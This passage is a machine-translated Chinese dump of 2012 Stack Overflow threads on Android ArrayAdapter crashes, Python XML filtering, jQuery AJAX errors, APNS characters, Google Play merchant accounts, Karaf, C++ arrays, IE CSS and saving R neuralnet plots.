08-08 15:19:48.015: E/AndroidRuntime(604): java.lang.NullPointerException
08-08 15:19:48.015: E/AndroidRuntime(604):  at android.widget.ArrayAdapter.createViewFromResource(ArrayAdapter.java:392)
08-08 15:19:48.015: E/AndroidRuntime(604):  at android.widget.ArrayAdapter.getView(ArrayAdapter.java:362)
08-08 15:19:48.015: E/AndroidRuntime(604):  at android.widget.AbsListView.obtainView(AbsListView.java:2267)
08-08 15:19:48.015: E/AndroidRuntime(604):  at android.widget.ListView.measureHeightOfChildren(ListView.java:1244)
08-08 15:19:48.015: E/AndroidRuntime(604):  at android.widget.ListView.onMeasure(ListView.java:1156)
08-08 15:19:48.015: E/AndroidRuntime(604):  at android.view.View.measure(View.java:15172)
08-08 15:19:48.015: E/AndroidRuntime(604):  at android.view.ViewGroup.measureChildWithMargins(ViewGroup.java:4814)
08-08 15:19:48.015: E/AndroidRuntime(604):  at android.widget.LinearLayout.measureChildBeforeLayout(LinearLayout.java:1390)
08-08 15:19:48.015: E/AndroidRuntime(604):  at android.widget.LinearLayout.measureVertical(LinearLayout.java:681)
08-08 15:19:48.015: E/AndroidRuntime(604):  at android.widget.LinearLayout.onMeasure(LinearLayout.java:574)
08-08 15:19:48.015: E/AndroidRuntime(604):  at android.view.View.measure(View.java:15172)
08-08 15:19:48.015: E/AndroidRuntime(604):  at android.view.ViewGroup.measureChildWithMargins(ViewGroup.java:4814)
08-08 15:19:48.015: E/AndroidRuntime(604):  at android.widget.FrameLayout.onMeasure(FrameLayout.java:310)
08-08 15:19:48.015: E/AndroidRuntime(604):  at android.view.View.measure(View.java:15172)
08-08 15:19:48.015: E/AndroidRuntime(604):  at android.widget.LinearLayout.measureVertical(LinearLayout.java:833)
08-08 15:19:48.015: E/AndroidRuntime(604):  at android.widget.LinearLayout.onMeasure(LinearLayout.java:574)
08-08 15:19:48.015: E/AndroidRuntime(604):  at android.view.View.measure(View.java:15172)
08-08 15:19:48.015: E/AndroidRuntime(604):  at android.view.ViewGroup.measureChildWithMargins(ViewGroup.java:4814)
08-08 15:19:48.015: E/AndroidRuntime(604):  at android.widget.FrameLayout.onMeasure(FrameLayout.java:310)
08-08 15:19:48.015: E/AndroidRuntime(604):  at com.android.internal.policy.impl.PhoneWindow$DecorView.onMeasure(PhoneWindow.java:2148)
08-08 15:19:48.015: E/AndroidRuntime(604):  at android.view.View.measure(View.java:15172)
08-08 15:19:48.015: E/AndroidRuntime(604):  at android.view.ViewRootImpl.performMeasure(ViewRootImpl.java:1848)
08-08 15:19:48.015: E/AndroidRuntime(604):  at android.view.ViewRootImpl.measureHierarchy(ViewRootImpl.java:1100)
08-08 15:19:48.015: E/AndroidRuntime(604):  at android.view.ViewRootImpl.performTraversals(ViewRootImpl.java:1273)
08-08 15:19:48.015: E/AndroidRuntime(604):  at android.view.ViewRootImpl.doTraversal(ViewRootImpl.java:998)
08-08 15:19:48.015: E/AndroidRuntime(604):  at android.view.ViewRootImpl$TraversalRunnable.run(ViewRootImpl.java:4212)
08-08 15:19:48.015: E/AndroidRuntime(604):  at android.view.Choreographer$CallbackRecord.run(Choreographer.java:725)
08-08 15:19:48.015: E/AndroidRuntime(604):  at android.view.Choreographer.doCallbacks(Choreographer.java:555)
08-08 15:19:48.015: E/AndroidRuntime(604):  at android.view.Choreographer.doFrame(Choreographer.java:525)
08-08 15:19:48.015: E/AndroidRuntime(604):  at android.view.Choreographer$FrameDisplayEventReceiver.run(Choreographer.java:711)
08-08 15:19:48.015: E/AndroidRuntime(604):  at android.os.Handler.handleCallback(Handler.java:615)
08-08 15:19:48.015: E/AndroidRuntime(604):  at android.os.Handler.dispatchMessage(Handler.java:92)
08-08 15:19:48.015: E/AndroidRuntime(604):  at android.os.Looper.loop(Looper.java:137)
08-08 15:19:48.015: E/AndroidRuntime(604):  at android.app.ActivityThread.main(ActivityThread.java:4745)
08-08 15:19:48.015: E/AndroidRuntime(604):  at java.lang.reflect.Method.invokeNative(Native Method)
08-08 15:19:48.015: E/AndroidRuntime(604):  at java.lang.reflect.Method.invoke(Method.java:511)
08-08 15:19:48.015: E/AndroidRuntime(604):  at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:786)
08-08 15:19:48.015: E/AndroidRuntime(604):  at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:553)
08-08 15:19:48.015: E/AndroidRuntime(604):  at dalvik.system.NativeStart.main(Native Method)
08-08 15:19:51.895: I/Process(604): Sending signal. PID: 604 SIG: 9 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-08-08T14:36:31.710

改变：

```
ArrayAdapter<String> value = new ArrayAdapter<String>(this,
       android.R.layout.simple_list_item_1, R.id.mylist, actions); 
```

对此：

```
ArrayAdapter<String> value = new ArrayAdapter<String>(this,
       android.R.layout.simple_list_item_1, android.R.id.text1, actions);

//OR

ArrayAdapter<String> value = new ArrayAdapter<String>(this,
       android.R.id.text1, actions); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-08T14:36:18.720

由于您的 ArrayAdapter 构造函数，您得到 NullPointerException ，第三个参数应该是布局内的 TextView （第二个参数），将其更改为并重`android.R.id.text1` 试。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-08T14:44:46.953

您的 arrayadapter 构造函数不正确。

ArrayAdapter(this,android.R.layout.simple_list_item_1, R.id.mylist, actions);

我相信 R.id.mylist 是列表视图的标识符？使用此构造函数，它实际上期望作为布局 android.R.layout.simple_list_item_1 一部分的 textview 的标识符

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-08T14:37:59.733

看来您滥用了它的构造函数。

尝试这个：

```
ArrayAdapter<String> value = new ArrayAdapter<String>(this,android.R.layout.simple_list_item_1, android.R.id.text1, actions); 
```

在[ArrayAdapter Documentaion](http://developer.android.com/reference/android/widget/ArrayAdapter.html)中，第三个参数应该是一个 ID`TextView`

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2012-08-08T14:42:28.810

您的布局似乎超出了代码范围，因此无法加载。当您检查日志时，您会看到错误“NullPointerException”，这表明您正在尝试访问不存在的对象。

大概就是这条线

```
ListView  v = (ListView)findViewById(R.id.mylist); 
```

这并没有像您期望的那样创建对象。如果你在这一行上放一个断点，你会看到它是空的，然后跳到下一行

```
v.setTextFilterEnabled(true); 
```

你会看到这里发生了异常。

请检查您的参考资料以及您如何调用布局以获得正确的对象加载。

# python - 在 Python 中过滤 xml 数据

> ID：11866720
> 
> 赞同：2
> 
> 时间：2012-08-08T14:27:57.063
> 
> 标签：python, xml

请帮助，Python初学者，

从 xml 获取所有数据后， **data_list = xmlTree.findall('.//data')** 例如在这里我得到 10 行现在，我只需要保留几行属性“名称”值与另一个列表的元素匹配的行(inputID) 里面有三个 ID。例如，仅保留 3 行其名称属性与列表元素匹配的行

谢谢你。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-08T16:06:11.160

您可以使用 for 循环遍历每个元素，然后决定是否应删除每个元素。我使用 Python 文档[ElementTree XML API](http://docs.python.org/library/xml.etree.elementtree.html)作为参考。

```
from xml.etree.ElementTree import ElementTree

tree = ElementTree()

# Test input
tree.parse("sample.xml")

# List containing names you want to keep
inputID = ['name1', 'name2', 'name3']

for node in tree.findall('.//data'):
    # Remove node if the name attribute value is not in inputID
    if not node.attrib.get('name') in inputID:
        tree.getroot().remove(node)

# Do what you want with the modified xml
tree.write('sample_out.xml') 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-08T14:36:54.040

您可以使用从树中删除节点

```
current_node.getparent().remove(current_node) 
```

# javascript - POST 500（内部服务器错误）

> ID：11866722
> 
> 赞同：-1
> 
> 时间：2012-08-08T14:28:08.733
> 
> 标签：javascript, jquery, ajax

我正在开发一个 Python 应用程序，该应用程序在选择正确的城市时使用 jQuery 智能选择地区，并在选择正确的国家/地区时智能选择城市，因此访问者无需刷新浏览器。

我在 Chrome 控制台上收到此错误：

> POST [Localhost url] 500（内部服务器错误）

这是我的测试代码：

```
 <header>
      <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js" /> 
      <script>
         function selectCountry(){
            $.ajax({
               type: 'POST',
               url: '/',
               data: 'countrySelect=1',

            });
            console.log(events);
         }

      </script>
   </header>

   <body>
      <script>
         var var1 = $_POST('countrySelect');
         document.write(var1);
      </script>

      <select onchange="javascript:selectCountry()">
         <option name="" value="">country a</option>
         <option name="" value="">country b</option>
      </select>
  </body> 
```

更改为`GET`可以正常工作，但不会在导航栏上显示变量。

任何人都可以帮忙吗？

提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-08T14:31:27.750

更改为 GET 不会在导航栏上显示变量，因为它是一个 ajax 请求。要解决此问题，请使用 fiddler（或浏览器的会话检查器）查看实际请求。我还将数据更改为 json 对象，例如 { countrySelect:"1" }

# ios - Apple Push Notification Service - 在消息文本中使用 £ 和 € 字符

> ID：11866723
> 
> 赞同：1
> 
> 时间：2012-08-08T14:28:15.267
> 
> 标签：ios, json, push-notification, apple-push-notifications

我正在构建一项服务来通过 APNS 向 iOS 设备推送通知。一切都很好，除了如果消息文本包含 £（英镑）或 €（欧元）字符，则通知不是由 APNS 发送的。我不认为这是 JSON 问题，因为它们通常不需要转义（无论如何我都尝试过转义但无济于事）。为了支持整个字符集，我需要做些什么吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-08T14:48:52.953

您是否尝试过 Unicode 的 JSON ASCII 转义？发送`\u00A3`£和`\u20AC`€。

[JSON 字符编码 - 浏览器是否很好地支持 UTF-8 或者我应该使用数字转义序列？](https://stackoverflow.com/questions/583562/json-character-encoding)

# android - 您能否以 Google 开发者的身份销售应用程序，还是必须是商家？

> ID：11866726
> 
> 赞同：6
> 
> 时间：2012-08-08T14:28:29.880
> 
> 标签：android

如果这不是一个典型的 SO 问题，我深表歉意，但我希望处于相同情况的人能够提供帮助。

在某些国家/地区，您无法开设 Google Merchant 帐户，但可以开设 Google Developer 帐户。那么，如果您开设了 Google Developer 帐户，但无法开设 Merchant 帐户，您仍然可以销售您的应用程序还是只能免费赠送它们？

我之所以问，是因为我只为销售过他们的应用程序的客户开发过，但我自己从未销售过应用程序，而且在我的国家（南非），您不能注册为 Google 商家。

**更新：**

对于在我的回答中列出的以下国家/地区以外的人，请注意[亚马逊 Android 开发人员](https://developer.amazon.com/welcome.html)目前没有这样的限制，并且开发人员注册目前是免费的（在当时或写作时）。付款是通过支票完成的。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-08-09T20:12:38.500

好的，我花了 25 美元才发现，作为一名 Google 开发人员并没有权利销售你的应用程序。注册开发者只能发布免费应用程序。您需要成为商家才能对应用程序收费。

这是我登录并点击“出售您的应用程序”链接后看到的第一件事：

> 商家支持的位置
> 
> 目前，以下国家/地区的开发者可以注册为 Google Checkout 商家并销售付费应用程序：
> 
> ```
> Argentina*
> Australia
> Austria
> Belgium
> Brazil*
> Canada
> Czech Republic
> Denmark
> Finland
> France
> Germany
> Hong Kong
> Ireland
> Israel
> Italy
> Japan
> Mexico
> Netherlands
> New Zealand
> Norway
> Poland
> Portugal
> Russia*
> Singapore
> Spain
> South Korea
> Sweden
> Switzerland
> Taiwan*
> United Kingdom
> United States 
> ```
> 
> 我们正在努力添加更多国家/地区，但我们无法就时间表提供任何指导。敬请期待！

我只是希望他们明智地使用我的 25 美元——那是一笔不错的啤酒钱。

**更新：**

我联系了 Google 支持，他们确认您需要成为注册商家才能销售 Android 应用程序。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-08-09T21:44:29.533

我是一名注册的谷歌开发者，有付费应用出售。没有 Google Merchant Account 就无法销售付费应用，因为它会处理所有付款。但是，您仍然可以提供免费应用程序。

编辑：也可以通过广告等方式将您的免费应用程序货币化。

# spring - 将 Spring Integration 应用程序嵌入 Apache Karaf

> ID：11866728
> 
> 赞同：0
> 
> 时间：2012-08-08T14:28:37.077
> 
> 标签：spring, spring-integration, apache-karaf

我正在开发一个 Spring 应用程序。就目前而言，该应用程序当前由一个主类按如下方式运行：

```
import org.springframework.context.support.ClassPathXmlApplicationContext;

public class Bootstrap {

    public static void main(String[] args) {
        new ClassPathXmlApplicationContext("spring-integration-demo.xml");
    }

} 
```

我想**将我的应用程序集成到[Apache Karaf](http://karaf.apache.org/)**（或将 Apache Karaf 集成到我的应用程序中？）。

我不确定从哪里以及如何开始。有人可以提供基本建议和/或相关文档的指针吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-14T10:49:12.407

如果你不知道 bundle 是什么，或者什么是 OSGi，但更重要的**是为什么**需要 osgi，那么我强烈建议先阅读 OSGi in Action，然后尝试一些示例，然后再考虑编码bundles - 有一个非常好的 maven 插件。

Yu 需要了解 OSGi 解决了（但也创建了 - 比如，在 OSGi 容器中的 JNDI 和 Classloaders 问题，它几乎不关心私有、公共或受保护 - 或者在这里更令人困惑 - 它添加了一些类似的东西，捆绑特定可见性，你需要理解）你的很多问题，但是如果你不明白这些是什么或者它如何准确地解决它们，那么编码到 OSGi 只是，好吧，没用。

据我所知，Spring 已经将几乎所有的 jar 包都作为捆绑包提供——你必须查看存储库。

顺便说一句，Apache Karaf 只是一个 OSGi 容器——但是一个非常好的容器。您还应该阅读它的文档。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-14T10:31:09.093

看来我的应用程序必须是 OSGI 包。此外，它的所有 jars/依赖项也必须是捆绑包。

部署捆绑包的一个好方法是将它们放到 Karaf 的 /deploy 目录中。

# c++ - 如何在 C++ 中设置数组

> ID：11866729
> 
> 赞同：0
> 
> 时间：2012-08-08T14:28:37.473
> 
> 标签：c++

我有一个类字段

```
char chars[4] 
```

我想在构造函数中初始化这个字段。
我的构造函数需要`char chars[]`作为参数获取，并且在构造函数调用中我想初始化我的类字段。
我可以这样做还是我需要打电话给副本？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-08T14:41:41.540

像这样使用`std::copy`：

```
class MyClass
{
    char m_x[4];    
public:
    MyClass(const char (&x)[4])
    {
        std::copy(x, x + 4, m_x);
    }
}; 
```

您应该在这里明确说明您的类型，以强制您准确传递 4 个元素。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-08T14:31:50.823

您需要调用副本。

```
MyClass::MyClass(const char* param)
{
  std::copy(param, param + 4, chars);
} 
```

这是一个有点风险的代码，因为不能保证 param 有四个字符要复制。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-08-08T14:39:24.653

另一种方法是使用`vector<char>`可以在初始化列表中初始化的 a：

```
class A
{
public:
    A(char* a): a_(a, a + strlen(a)) {}
private:
    std::vector<char> a_;
}; 
```

[请参阅http://ideone.com/x9p6I](http://ideone.com/x9p6I)上的演示。

* * *

这可以制作成模板以支持不同的类型，但需要将数组中的元素数量提供给构造函数（因为`strlen()`不适用于 的数组`int`）。例如：

```
template <class T>
class A
{
public:
    A(const T* a, const size_t count): a_(a, a + count) {}
private:
    std::vector<T> a_;
}; 
```

[请参阅http://ideone.com/hhoaC](http://ideone.com/hhoaC)上的演示。

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2012-08-08T14:37:23.170

据我了解，您需要创建`Conversion constructors`，它应该如下所示： `A::A(const char* string) {strncpy(chars, string, 4); }`

* * *

## 回答 #5

> 赞同：-2
> 
> 时间：2012-08-08T14:35:33.757

是的。您需要从输入参数中复制内容。

# html - IE中的CSS位置绝对和位置相对错误

> ID：11866732
> 
> 赞同：0
> 
> 时间：2012-08-08T14:28:47.733
> 
> 标签：html, css

我试图制作一个简单的 html 和 CSS 东西：我有一个带有相对位置的巨大 div，然后有很多包含绝对位置的链接..

它在 FF 和 chrome 中运行良好，但在 IE 中非常糟糕。

似乎在 IE 中定位不好，也没有得到“margin: 0 auto;” 东西。。

这是我的代码：

HTML：

```
<div class="wpr">
<a href="http://www.leumi.co.il/" target="_blank" id="leumi"></a>
<a href="http://www.oren-ins.co.il/" target="_blank" id="oren"></a>
<a href="http://www.energy.org.il/" target="_blank" id="energy"></a>
<a href="http://www.lionorl.co.il/" target="_blank" id="leon"></a>
<a href="http://www.calcalist.co.il/" target="_blank" id="yit"></a>
<a href="http://www.yit.co.il/" target="_blank" id="calcalist"></a>
<a href="https://events.eventact.com/runreg/event/regform.aspx?event=4243&company=204&form=1617&account=0&lang=he&login=562974333928" target="_blank" id="register"><img src="sign.gif" alt="register" /></a> 
```

CSS：

```
.wpr
    {

        background: url('bg_page.gif') no-repeat 0 0 ;
        width: 980px; height: 643px; margin: 0 auto; position: relative;
        }

        #leumi{ position: absolute;  top: 181px; right:96px ; width: 102px; height: 30px; }
        #oren{ position: absolute;  top: 176px; right:227px ; width: 139px; height: 43px; }
        #energy{ position: absolute;  top: 176px; right:380px ; width: 139px; height: 43px;}
        #leon{ position: absolute;  top: 510px; right:812px ; width: 139px; height: 43px; }
        #calcalist{ position: absolute;  top: 584px; right:841px ; width: 139px; height: 43px;}
        #yit{ position: absolute;  top: 579px; right:0px ; width: 139px; height: 43px; }
        #register{ position: absolute;  top: 444px; right:808px ; width: 139px; height: 43px; } 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-08T14:56:23.940

它在 Chrome 和 FireFox 中运行良好，因为它们会自动更正您的 HTML 代码。因此，如果您犯了错误，例如不关闭 a`<div>`他们会为您关闭它。IE 不会关闭它，并向您显示不正确的布局，而不是您所期望的。在那种情况下，IE 是唯一正确的浏览器，但是由于所有的抨击，每个人都会认为 IE 是处理错误的浏览器。

对于 doctype，使用这个：

`<!doctype html>`

您的 CSS 代码缺少一些东西，`<a>`是一个内联元素，因此除非您将其设为块元素，否则高度和宽度将不起作用。

```
.wpr a {display: block;} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-09T07:18:39.677

请在您的课程中添加`left`和`top`属性`.wpr`

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-08T14:38:40.930

您使用的是哪种文档类型和 IE 版本？

尝试使用；

```
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"> 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-09T07:10:57.457

如果我有一个包装它的标签，它似乎对我有用。这不是解决它的最优雅的方法，但它有效。

**继承人的代码：**

```
 <table align="center" >
<tr>
<td>
<div class="wpr">
    <a href="http://....il/" target="_blank" id="leumi"></a>
    <a href="http://...co.il/" target="_blank" id="oren"></a>
    <a href="http://....il/" target="_blank" id="energy"></a>
    <a href="http://..." target="_blank" id="leon"></a>
    <a href="http://../" target="_blank" id="yit"></a>
    <a href="http://..." target="_blank" id="calcalist"></a>
    <a href="https://events.eventact.com/runreg/event/regform.aspx?event=4243&company=204&form=1617&account=0&lang=he&login=562974333928" target="_blank" id="register"><img src="sign.gif" alt="register" /></a>
</div>

</td>
</tr>
</table> 
```

**CSS：**

```
 table 
{
    margin: 0 auto;
    width: 980px;
    border-collapse: collapse;
    border-spacing: 0;
}
    .wpr
    {

        background: url('bg_page.gif') no-repeat 0 0 ;
        width: 980px; height: 643px; position: relative;overflow:hidden;
    }

        #leumi{ position: absolute;  top: 181px; right:96px ; width: 102px; height: 30px; }
        #oren{ position: absolute;  top: 176px; right:227px ; width: 139px; height: 43px; }
        #energy{ position: absolute;  top: 176px; right:380px ; width: 139px; height: 43px;}
        #leon{ position: absolute;  top: 510px; right:812px ; width: 139px; height: 43px; }
        #calcalist{ position: absolute;  top: 584px; right:841px ; width: 139px; height: 43px;}
        #yit{ position: absolute;  top: 579px; right:0px ; width: 139px; height: 43px; }
        #register{ position: absolute;  top: 444px; right:790px ; width: 139px; height: 43px; } 
```

# r - 使用神经网络包保存神经网络图时遇到问题 - R

> ID：11866740
> 
> 赞同：7
> 
> 时间：2012-08-08T14:29:02.513
> 
> 标签：r, plot, neural-network

我`neuralnet`在 R 中使用包，但是在将绘图保存到磁盘时遇到问题。

```
data(iris)
attach(iris)
library(neuralnet)

nn <- neuralnet(as.numeric(Species) ~ Sepal.Length + Sepal.Width + Petal.Length + Petal.Width, data = iris)

png("test.png")
plot(nn)
dev.off() 
```

试图参考[手册](http://cran.r-project.org/web/packages/neuralnet/neuralnet.pdf)，在`plot.nn()`它说的部分：

```
file      a character string naming the plot to write to. If not stated, 
the plot will not be saved. 
```

但是，执行以下操作不会保存有效的绘图：

```
png("test.png")
plot(nn, file = "test.png")
dev.off() 
```

平台：

```
Mac OSX 10.7.3 
```

R版本：

```
platform       x86_64-apple-darwin11.3.0    
arch           x86_64                       
os             darwin11.3.0                 
system         x86_64, darwin11.3.0         
status                                      
major          2                            
minor          15.1                         
year           2012                         
month          06                           
day            22                           
svn rev        59600                        
language       R                            
version.string R version 2.15.1 (2012-06-22)
nickname       Roasted Marshmallows 
```

注意：R 是通过 macports 安装的

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-08-09T11:03:37.893

在与 Frauke Guenther（ 的维护者`neuralnet`）交谈后，她解释说问题在于`neuralnet`' 同时绘制多个神经网络的能力。

应该已经将`plot(..., file = "")`文件保存到磁盘，但似乎无法正常运行，修复程序将很快修补到程序包本身，但同时她还提供了一个快速`plot.nn()`修复程序，允许将绘图保存到磁盘。

```
plot.nn <-
function (x, rep = NULL, x.entry = NULL, x.out = NULL, radius = 0.15, 
    arrow.length = 0.2, intercept = TRUE, intercept.factor = 0.4, 
    information = TRUE, information.pos = 0.1, col.entry.synapse = "black", 
    col.entry = "black", col.hidden = "black", col.hidden.synapse = "black", 
    col.out = "black", col.out.synapse = "black", col.intercept = "blue", 
    fontsize = 12, dimension = 6, show.weights = TRUE, file = NULL, 
    ...) 
{
    net <- x
    if (is.null(net$weights)) 
        stop("weights were not calculated")
    if (!is.null(file) && !is.character(file)) 
        stop("'file' must be a string")
    if (is.null(rep)) {
        for (i in 1:length(net$weights)) {
            if (!is.null(file)) 
                file.rep <- paste(file, ".", i, sep = "")
            else file.rep <- NULL
            #dev.new()
            plot.nn(net, rep = i, x.entry, x.out, radius, arrow.length, 
                intercept, intercept.factor, information, information.pos, 
                col.entry.synapse, col.entry, col.hidden, col.hidden.synapse, 
                col.out, col.out.synapse, col.intercept, fontsize, 
                dimension, show.weights, file.rep, ...)
        }
    }
    else {
        if (is.character(file) && file.exists(file)) 
            stop(sprintf("%s already exists", sQuote(file)))
        result.matrix <- t(net$result.matrix)
        if (rep == "best") 
            rep <- as.integer(which.min(result.matrix[, "error"]))
        if (rep > length(net$weights)) 
            stop("'rep' does not exist")
        weights <- net$weights[[rep]]
        if (is.null(x.entry)) 
            x.entry <- 0.5 - (arrow.length/2) * length(weights)
        if (is.null(x.out)) 
            x.out <- 0.5 + (arrow.length/2) * length(weights)
        width <- max(x.out - x.entry + 0.2, 0.8) * 8
        radius <- radius/dimension
        entry.label <- net$model.list$variables
        out.label <- net$model.list$response
        neuron.count <- array(0, length(weights) + 1)
        neuron.count[1] <- nrow(weights[[1]]) - 1
        neuron.count[2] <- ncol(weights[[1]])
        x.position <- array(0, length(weights) + 1)
        x.position[1] <- x.entry
        x.position[length(weights) + 1] <- x.out
        if (length(weights) > 1) 
            for (i in 2:length(weights)) {
                neuron.count[i + 1] <- ncol(weights[[i]])
                x.position[i] <- x.entry + (i - 1) * (x.out - 
                  x.entry)/length(weights)
            }
        y.step <- 1/(neuron.count + 1)
        y.position <- array(0, length(weights) + 1)
        y.intercept <- 1 - 2 * radius
        information.pos <- min(min(y.step) - 0.1, 0.2)
        if (length(entry.label) != neuron.count[1]) {
            if (length(entry.label) < neuron.count[1]) {
                tmp <- NULL
                for (i in 1:(neuron.count[1] - length(entry.label))) {
                  tmp <- c(tmp, "no name")
                }
                entry.label <- c(entry.label, tmp)
            }
        }
        if (length(out.label) != neuron.count[length(neuron.count)]) {
            if (length(out.label) < neuron.count[length(neuron.count)]) {
                tmp <- NULL
                for (i in 1:(neuron.count[length(neuron.count)] - 
                  length(out.label))) {
                  tmp <- c(tmp, "no name")
                }
                out.label <- c(out.label, tmp)
            }
        }
        grid.newpage()
        pushViewport(viewport(name = "plot.area", width = unit(dimension, 
            "inches"), height = unit(dimension, "inches")))
        for (k in 1:length(weights)) {
            for (i in 1:neuron.count[k]) {
                y.position[k] <- y.position[k] + y.step[k]
                y.tmp <- 0
                for (j in 1:neuron.count[k + 1]) {
                  y.tmp <- y.tmp + y.step[k + 1]
                  result <- calculate.delta(c(x.position[k], 
                    x.position[k + 1]), c(y.position[k], y.tmp), 
                    radius)
                  x <- c(x.position[k], x.position[k + 1] - result[1])
                  y <- c(y.position[k], y.tmp + result[2])
                  grid.lines(x = x, y = y, arrow = arrow(length = unit(0.15, 
                    "cm"), type = "closed"), gp = gpar(fill = col.hidden.synapse, 
                    col = col.hidden.synapse, ...))
                  if (show.weights) 
                    draw.text(label = weights[[k]][neuron.count[k] - 
                      i + 2, neuron.count[k + 1] - j + 1], x = c(x.position[k], 
                      x.position[k + 1]), y = c(y.position[k], 
                      y.tmp), xy.null = 1.25 * result, color = col.hidden.synapse, 
                      fontsize = fontsize - 2, ...)
                }
                if (k == 1) {
                  grid.lines(x = c((x.position[1] - arrow.length), 
                    x.position[1] - radius), y = y.position[k], 
                    arrow = arrow(length = unit(0.15, "cm"), 
                      type = "closed"), gp = gpar(fill = col.entry.synapse, 
                      col = col.entry.synapse, ...))
                  draw.text(label = entry.label[(neuron.count[1] + 
                    1) - i], x = c((x.position - arrow.length), 
                    x.position[1] - radius), y = c(y.position[k], 
                    y.position[k]), xy.null = c(0, 0), color = col.entry.synapse, 
                    fontsize = fontsize, ...)
                  grid.circle(x = x.position[k], y = y.position[k], 
                    r = radius, gp = gpar(fill = "white", col = col.entry, 
                      ...))
                }
                else {
                  grid.circle(x = x.position[k], y = y.position[k], 
                    r = radius, gp = gpar(fill = "white", col = col.hidden, 
                      ...))
                }
            }
        }
        out <- length(neuron.count)
        for (i in 1:neuron.count[out]) {
            y.position[out] <- y.position[out] + y.step[out]
            grid.lines(x = c(x.position[out] + radius, x.position[out] + 
                arrow.length), y = y.position[out], arrow = arrow(length = unit(0.15, 
                "cm"), type = "closed"), gp = gpar(fill = col.out.synapse, 
                col = col.out.synapse, ...))
            draw.text(label = out.label[(neuron.count[out] + 
                1) - i], x = c((x.position[out] + radius), x.position[out] + 
                arrow.length), y = c(y.position[out], y.position[out]), 
                xy.null = c(0, 0), color = col.out.synapse, fontsize = fontsize, 
                ...)
            grid.circle(x = x.position[out], y = y.position[out], 
                r = radius, gp = gpar(fill = "white", col = col.out, 
                  ...))
        }
        if (intercept) {
            for (k in 1:length(weights)) {
                y.tmp <- 0
                x.intercept <- (x.position[k + 1] - x.position[k]) * 
                  intercept.factor + x.position[k]
                for (i in 1:neuron.count[k + 1]) {
                  y.tmp <- y.tmp + y.step[k + 1]
                  result <- calculate.delta(c(x.intercept, x.position[k + 
                    1]), c(y.intercept, y.tmp), radius)
                  x <- c(x.intercept, x.position[k + 1] - result[1])
                  y <- c(y.intercept, y.tmp + result[2])
                  grid.lines(x = x, y = y, arrow = arrow(length = unit(0.15, 
                    "cm"), type = "closed"), gp = gpar(fill = col.intercept, 
                    col = col.intercept, ...))
                  xy.null <- cbind(x.position[k + 1] - x.intercept - 
                    2 * result[1], -(y.tmp - y.intercept + 2 * 
                    result[2]))
                  if (show.weights) 
                    draw.text(label = weights[[k]][1, neuron.count[k + 
                      1] - i + 1], x = c(x.intercept, x.position[k + 
                      1]), y = c(y.intercept, y.tmp), xy.null = xy.null, 
                      color = col.intercept, alignment = c("right", 
                        "bottom"), fontsize = fontsize - 2, ...)
                }
                grid.circle(x = x.intercept, y = y.intercept, 
                  r = radius, gp = gpar(fill = "white", col = col.intercept, 
                    ...))
                grid.text(1, x = x.intercept, y = y.intercept, 
                  gp = gpar(col = col.intercept, ...))
            }
        }
        if (information) 
            grid.text(paste("Error: ", round(result.matrix[rep, 
                "error"], 6), "   Steps: ", result.matrix[rep, 
                "steps"], sep = ""), x = 0.5, y = information.pos, 
                just = "bottom", gp = gpar(fontsize = fontsize + 
                  2, ...))
        popViewport()
        if (!is.null(file)) {
            weight.plot <- recordPlot()
            save(weight.plot, file = file)
        }
    }
}
calculate.delta <-
function (x, y, r) 
{
    delta.x <- x[2] - x[1]
    delta.y <- y[2] - y[1]
    x.null <- r/sqrt(delta.x^2 + delta.y^2) * delta.x
    if (y[1] < y[2]) 
        y.null <- -sqrt(r^2 - x.null^2)
    else if (y[1] > y[2]) 
        y.null <- sqrt(r^2 - x.null^2)
    else y.null <- 0
    c(x.null, y.null)
}
draw.text <-
function (label, x, y, xy.null = c(0, 0), color, alignment = c("left", 
    "bottom"), ...) 
{
    x.label <- x[1] + xy.null[1]
    y.label <- y[1] - xy.null[2]
    x.delta <- x[2] - x[1]
    y.delta <- y[2] - y[1]
    angle = atan(y.delta/x.delta) * (180/pi)
    if (angle < 0) 
        angle <- angle + 0
    else if (angle > 0) 
        angle <- angle - 0
    if (is.numeric(label)) 
        label <- round(label, 5)
    pushViewport(viewport(x = x.label, y = y.label, width = 0, 
        height = , angle = angle, name = "vp1", just = alignment))
    grid.text(label, x = 0, y = unit(0.75, "mm"), just = alignment, 
        gp = gpar(col = color, ...))
    popViewport()
} 
```

将上面的代码粘贴到您的 R 交互式提示符中，当您希望保存绘图时，请执行以下操作：

```
png("test.png")
plot(nn)
dev.off() 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2018-10-12T05:11:20.600

**绘图** 后这对我有用`plot(nn)`：

```
dev.print(pdf, 'ANN_coefficients_plot.pdf') 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-08T14:43:58.777

